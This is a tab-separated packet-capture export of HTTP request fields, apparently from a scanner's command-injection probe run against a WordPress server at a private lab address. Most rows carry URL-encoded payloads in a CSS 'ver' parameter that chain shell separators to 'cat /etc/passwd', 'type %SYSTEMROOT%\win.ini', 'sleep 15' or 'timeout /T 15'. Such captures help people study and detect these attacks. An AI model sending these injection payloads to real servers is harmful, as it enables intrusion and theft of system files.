http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
											no-cache								0	0							192.168.1.102									4892					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%3Bcat+%2Fetc%2Fpasswd%3B%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%3Bcat+%2Fetc%2Fpasswd%3B%22
											no-cache								0	0							192.168.1.102									4895					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26cat+%2Fetc%2Fpasswd%26%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26cat+%2Fetc%2Fpasswd%26%27
											no-cache								0	0							192.168.1.102									4904					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%3Bcat+%2Fetc%2Fpasswd%3B%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%3Bcat+%2Fetc%2Fpasswd%3B%27
											no-cache								0	0							192.168.1.102									4906					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%0Acat+%2Fetc%2Fpasswd%0A		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%0Acat+%2Fetc%2Fpasswd%0A
											no-cache								0	0							192.168.1.102									4909					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%60cat+%2Fetc%2Fpasswd%60		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%60cat+%2Fetc%2Fpasswd%60
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4891					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									4912					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7C%7Ccat+%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7C%7Ccat+%2Fetc%2Fpasswd
											no-cache								0	0							192.168.1.102									4920					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26%26cat+%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26%26cat+%2Fetc%2Fpasswd
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4914					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									4923					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ccat+%2Fetc%2Fpasswd%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ccat+%2Fetc%2Fpasswd%23
											no-cache								0	0							192.168.1.102									4926					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26cat%24oi+%24oi%2Fetc%24oi%2Fpasswd%26		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26cat%24oi+%24oi%2Fetc%24oi%2Fpasswd%26
											no-cache								0	0							192.168.1.102									4928					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26sleep+15%26		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26sleep+15%26
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4925					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									4932					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%3Bsleep+15%3B		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%3Bsleep+15%3B
											no-cache								0	0							192.168.1.102									4939					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26sleep+15%26%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26sleep+15%26%22
											no-cache								0	0							192.168.1.102									4946					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%3Bsleep+15%3B%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%3Bsleep+15%3B%22
											no-cache								0	0							192.168.1.102									4948					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26sleep+15%26%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26sleep+15%26%27
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4937					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									4951					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%3Bsleep+15%3B%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%3Bsleep+15%3B%27
											no-cache								0	0							192.168.1.102									4960					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%0Asleep+15%0A		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%0Asleep+15%0A
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4954					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									4963					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%60sleep+15%60		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%60sleep+15%60
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4966					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%26timeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%26timeout+%2FT+15
											no-cache								0	0							192.168.1.102									4970					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7C%7Csleep+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7C%7Csleep+15
											no-cache								0	0							192.168.1.102									4975					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26%26sleep+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26%26sleep+15
											no-cache								0	0							192.168.1.102									4977					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Csleep+15%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Csleep+15%23
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4973					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%7Ctimeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%7Ctimeout+%2FT+15
											no-cache								0	0							192.168.1.102									4984					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26sleep%24f+15%26		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26sleep%24f+15%26
											no-cache								0	0							192.168.1.102									4990					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4986					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%26timeout+%2FT+15%26%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%26timeout+%2FT+15%26%22
											no-cache								0	0							192.168.1.102									4995					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									4996					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%7Ctimeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%22%7Ctimeout+%2FT+15
											no-cache								0	0							192.168.1.102									5002					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									5005					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%26timeout+%2FT+15%26%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%26timeout+%2FT+15%26%27
											no-cache								0	0							192.168.1.102									5007					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
											no-cache								0	0							192.168.1.102									5014					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									5013					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%7Ctimeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%27%7Ctimeout+%2FT+15
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									5025					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9run+timeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9run+timeout+%2FT+15
											no-cache								0	0							192.168.1.102									5021					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
											no-cache								0	0							192.168.1.102									5032					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9run+type+%25SYSTEMROOT%25%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9run+type+%25SYSTEMROOT%25%5Cwin.ini
											no-cache								0	0							192.168.1.102									5031					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									5042					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									5044					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									5046					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									5035					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%3Bget-help		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=5.9%3Bget-help
											no-cache								0	0							192.168.1.102									5048					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00
											no-cache								0	0							192.168.1.102									5060					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26timeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%26timeout+%2FT+15
											no-cache								0	0							192.168.1.102									5062					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctimeout+%2FT+15		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=5.9%7Ctimeout+%2FT+15
